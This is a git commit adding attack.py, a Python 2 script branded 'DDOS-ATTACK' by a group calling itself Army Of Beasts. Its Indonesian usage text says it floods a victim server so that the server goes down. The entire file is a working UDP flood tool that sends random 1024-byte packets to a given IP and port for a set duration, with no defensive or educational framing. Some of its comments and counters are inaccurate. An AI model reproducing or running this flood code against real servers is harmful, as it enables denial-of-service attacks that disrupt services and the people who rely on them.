f7f7dda576b497f40c88a5b8087754a52c463c29
Army Of Beasts <90514515+Armyofbeast@users.noreply.github.com>
2021-09-12 08:59:41 +0700

    Add files via upload

---
+++ attack.py
@@ -0,0 +1,52 @@
+#!/usr/bin/python2
+# coding=utf-8
+
+
+import time,socket,sys,os,re,random,math,getopt,string
+
+
+#usage#
+def usage():
+    print "\033[1;91m"
+    print "#####################################"
+    print "#             DDOS-ATTACK           # "
+    print "#                                   # "
+    print "#                 TEAM              # "
+    print "#             Army Of Beasts        # "
+    print "#####################################"
+    print "DDOS-ATTACK adalah tool untuk mengirim packet ke server korban."
+    print "untuk membuat server korban menjadi down"
+    print "jangan melakukan serangan sendirian!"
+    print
+    print
+    print
+    print "cara pakai"
+    print "python2 attack.py <ip> <port> <packet>"
+
+def flood (victim, vport, duration):
+    # okay so here I create the server, when i say "SOCK_DGRAM" it means it's a UDP type program
+    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    # 1024 representes one byte to the server
+    bytes = random._urandom(1024)
+    timeout =  time.time() + duration
+    sent = 300000
+
+    while 1:
+        if time.time() > timeout:
+            break
+        else:
+            pass
+        client.sendto(bytes, (victim, vport))
+        sent = sent + 1
+        print "Attacking %s sent packages %s at the port %s "%(sent, victim, vport)
+
+def main():
+    print len(sys.argv)
+    if len(sys.argv) != 4:
+        usage()
+    else:
+        flood(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]))
+print "\033[1;91m"
+if __name__ == '__main__':
+    main()
+
